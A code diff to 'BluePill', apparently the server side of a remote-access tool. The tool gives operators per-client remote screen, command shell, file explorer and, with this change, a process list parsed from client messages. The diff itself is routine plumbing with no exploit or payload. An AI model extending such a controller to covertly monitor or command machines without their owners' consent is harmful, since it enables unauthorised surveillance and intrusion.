@@ -35,6 +35,7 @@ class BluePill:
                 self.my_window.remote_window.append(False)
                 self.my_window.command_window.append(None)
                 self.my_window.file_explorer.append(None)
+                self.my_window.process_manager.append(None)
                 self.send(b'BluePillv1.0', conn)
                 tcp_data = self.recv(conn)
                 print(tcp_data)
@@ -94,17 +95,20 @@ class BluePill:
                     value = self.my_window.file_explorer[client_id-1].value
                     if directory == "ERROR": title = "File Explorer"; msg = "Windows can't find '" + value + "'. Check Spelling and try again."
                     if directory == "PERMISSION": title = value.split("\\")[-1]; msg = "You don't currently have permission to access this folder."
-                    print(title, msg)
                     self.my_window.file_explorer[client_id-1].show_error_popup(title, msg)
                     self.my_window.file_explorer[client_id-1].search_box.setText(value)
                 elif data.startswith(b"File->"):
                     file_bytes = data.split(b"File->")[1]
                     threading.Thread(target=self.my_window.file_explorer[client_id-1].text_updater.add_text, args=((file_bytes.decode('utf-8', errors='ignore'),))).start()
+                elif data.startswith(b"pids->"):
+                    processes = data.split(b"pids->")[1]
+                    procids = json.loads(processes)
+                    print(procids)
             except Exception as e:
                 print(e, "RECV_TC_DATA")
                 break
     def heartbeat(self, client_id, conn):
-        # This function checks if the client is alive or not by sending Alive?
+        # This function checks if the client is alive or not by sending Alive
         print(client_id, type(client_id))
         while self.active:
             try:
